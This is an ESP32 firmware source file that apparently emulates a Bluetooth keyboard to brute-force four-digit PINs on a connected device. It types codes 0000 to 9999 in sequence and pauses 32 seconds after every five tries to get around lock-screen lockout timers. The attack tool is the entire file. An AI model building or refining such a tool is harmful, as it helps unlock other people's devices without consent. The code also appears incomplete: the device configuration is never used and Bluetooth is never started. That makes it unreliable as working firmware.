#include <stdio.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "esp_log.h"
#include "driver/gpio.h"
#include "nvs_flash.h"
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_gatts_api.h"
#include "esp_bt_defs.h"
#include "esp_bt_main.h"
#include "esp_hid_device.h"
#include "esp_hid_gap.h"

#define BOOT_BUTTON_PIN GPIO_NUM_0

static int currentPin = 0;
static int attemptCount = 0;
static bool isRunning = false;
static bool isConnected = false;

static void hid_demo_event_cb(void *handler_args, esp_event_base_t base, int32_t id, void *event_data) {
    esp_hid_status_t status = (esp_hid_status_t)id;
    if (base == ESP_HID_DEVICE_EVENT) {
        if (status == ESP_HID_STATUS_CONNECTED) {
            isConnected = true;
        } else if (status == ESP_HID_STATUS_DISCONNECTED) {
            isConnected = false;
            isRunning = false;
        }
    }
}

void send_key(uint8_t modifier, uint8_t keycode) {
    uint8_t buffer[8] = {modifier, 0, keycode, 0, 0, 0, 0, 0};
    esp_hid_device_send_report(ESP_HID_REPORT_TYPE_INPUT, 0, buffer, sizeof(buffer));
    vTaskDelay(pdMS_TO_TICKS(10));
    uint8_t empty_buffer[8] = {0, 0, 0, 0, 0, 0, 0, 0};
    esp_hid_device_send_report(ESP_HID_REPORT_TYPE_INPUT, 0, empty_buffer, sizeof(empty_buffer));
}

void type_char(char c) {
    if (c >= '0' && c <= '9') {
        uint8_t keycode = 0x27;
        if (c == '0') {
            keycode = 0x27;
        } else {
            keycode = 0x1E + (c - '1');
        }
        send_key(0, keycode);
    }
}

void pin_brute_task(void *pvParameters) {
    gpio_config_t io_conf = {};
    io_conf.intr_type = GPIO_INTR_DISABLE;
    io_conf.mode = GPIO_MODE_INPUT;
    io_conf.pin_bit_mask = (1ULL << BOOT_BUTTON_PIN);
    io_conf.pull_up_en = GPIO_PULLUP_ENABLE;
    io_conf.pull_down_en = GPIO_PULLDOWN_DISABLE;
    gpio_config(&io_conf);

    while (1) {
        if (!isConnected) {
            isRunning = false;
            vTaskDelay(pdMS_TO_TICKS(500));
            continue;
        }

        if (!isRunning) {
            if (gpio_get_level(BOOT_BUTTON_PIN) == 0) {
                vTaskDelay(pdMS_TO_TICKS(50));
                if (gpio_get_level(BOOT_BUTTON_PIN) == 0) {
                    vTaskDelay(pdMS_TO_TICKS(5000));
                    isRunning = true;
                }
            }
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        char pinString[5];
        sprintf(pinString, "%04d", currentPin);

        for (int i = 0; i < 4; i++) {
            if (!isConnected) break;
            type_char(pinString[i]);
            vTaskDelay(pdMS_TO_TICKS(15));
        }

        currentPin++;
        if (currentPin > 9999) {
            currentPin = 0;
        }

        vTaskDelay(pdMS_TO_TICKS(300));

        attemptCount++;
        if (attemptCount >= 5) {
            attemptCount = 0;
            vTaskDelay(pdMS_TO_TICKS(32000));
        }
    }
}

extern "C" void app_main(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    esp_hid_device_config_t cfg = {
        .vendor_id = 0x16C0,
        .product_id = 0x05DF,
        .version = 0x0100,
        .device_name = "ESP32_PIN_Tool",
        .manufacturer_name = "Espressif",
        .serial_number = "123456",
        .report_maps = NULL,
        .report_maps_len = 0
    };

    xTaskCreate(&pin_brute_task, "pin_brute_task", 4096, NULL, 5, NULL);
}
